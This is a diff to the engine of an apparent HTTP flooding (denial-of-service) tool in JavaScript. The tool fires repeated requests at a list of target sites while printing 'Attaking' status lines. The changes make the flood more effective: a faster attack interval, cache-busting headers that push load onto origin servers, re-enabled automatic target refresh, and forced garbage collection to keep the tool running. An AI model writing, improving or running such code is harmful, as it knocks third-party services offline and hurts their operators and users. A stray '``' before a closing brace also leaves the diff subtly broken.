@@ -22,7 +22,7 @@ export default class Engine {
         this.responses = 0;
         this.requests = 0;
 
-        this.updated = false;
+        this.updating = false;
         this.paused = false;
 
         this.start();
@@ -47,13 +47,13 @@ export default class Engine {
 
     async updateTargets () {
         this.paused = true;
-        this.updated = true;
+        this.updating = true;
         this.fillCode();
         this.targets = manualTargets.slice();
         if (this.argv.targets) {
             this.targets = this.targets.concat(await TargetsParser.getAllTargets());
         }
-        this.updated = false;
+        this.updating = false;
     }
 
     render(delta = 0) {
@@ -68,21 +68,34 @@ export default class Engine {
         let timeout = setTimeout(() => {
             this.render(this.deltaTime);
             clearTimeout(timeout);
-        }, 100);
+        }, 1000 / 60);
     }
 
     enterFrame () {
-        if (this.requests - this.responses >= 2000) {
-            this.paused = true;
-        }
-        if (!this.paused && this.everyTimeElapsed(500)) {
-            this.attack();
+        if (this.done) {
             this.fillCode();
-            if (this.everyTimeElapsed(this.argv.targetsRefresh)) {
-                //this.updateTargets();
+            setTimeout(() => process.exit(), 500);
+        }
+        if (this.totalTime > 0 && this.timeElapsed > this.totalTime && !this.preDone) {
+            this.preDone = true;
+            this.fillCode();
+        }
+        if (!this.preDone) {
+            if (this.requests - this.responses >= 2000) {
+                this.paused = true;
             }
-        } else if (this.paused && this.requests === this.responses) {
-            this.paused = false;
+            if (!this.paused && this.everyTimeElapsed(100)) {
+                this.attack();
+                this.fillCode();
+                if (this.everyTimeElapsed(this.argv.targetsRefresh)) {
+                    this.updateTargets();
+                }
+            } else if (this.paused && this.requests === this.responses) {
+                this.paused = false;
+                this.fillCode();
+            }
+        } else if (this.responses >= this.requests && !this.done) {
+            this.done = true;
             this.fillCode();
         }
 
@@ -96,7 +109,11 @@ export default class Engine {
             axios({
                 url,
                 timeout: this.argv.timeout,
-                signal: controller.signal
+                signal: controller.signal,
+                headers: {
+                    "Cache-Control": "private, no-cache, no-store, must-revalidate, max-age=0",
+                    "Pragma": "no-cache"
+                }
             })
                 .then((response) => {
                     if (response.status) {
@@ -116,6 +133,7 @@ export default class Engine {
                     controller.abort();
                 });
         }
+        global.gc();
     }
 
     everyTimeElapsed (period) {
@@ -140,10 +158,11 @@ export default class Engine {
         return "";
     }
 
-    fillCode(statusCode = "") {
-        if (statusCode === "") return;
+    fillCode(statusCode = -1) {
+        //if (statusCode === -1) return;
 
         let string = "";
+
         if (this.codes[statusCode] === undefined) {
             this.codes[statusCode] = 1;
         } else if (statusCode) {
@@ -162,7 +181,7 @@ export default class Engine {
 
         if (!this.paused) {
             string += `Attaking: ${this.url}\r\n`;
-        } else if (this.updated) {
+        } else if (this.updating) {
             string += `Updating targets...\r\n`;
         } else if (this.paused) {
             string += `Waiting...\r\n`;
@@ -175,12 +194,17 @@ export default class Engine {
             string += `time: ${this.msToTime(this.timeElapsed)}`;
         }
 
-        this.spinner.text = string;
-
-        if (this.totalTime > 0 && this.timeElapsed > this.totalTime && this.responses >= this.requests) {
-            this.spinner.succeed("Done!");
+        if (this.preDone && !this.done) {
+            string += "\r\nWaiting for rest requests...";
         }
-    }
+
+
+        if (this.done) {
+            string += "\r\nDone!";
+        }
+
+        this.spinner.text = string;
+``    }
 
     msToTime(duration) {
         var milliseconds = parseInt((duration % 1000) / 100),
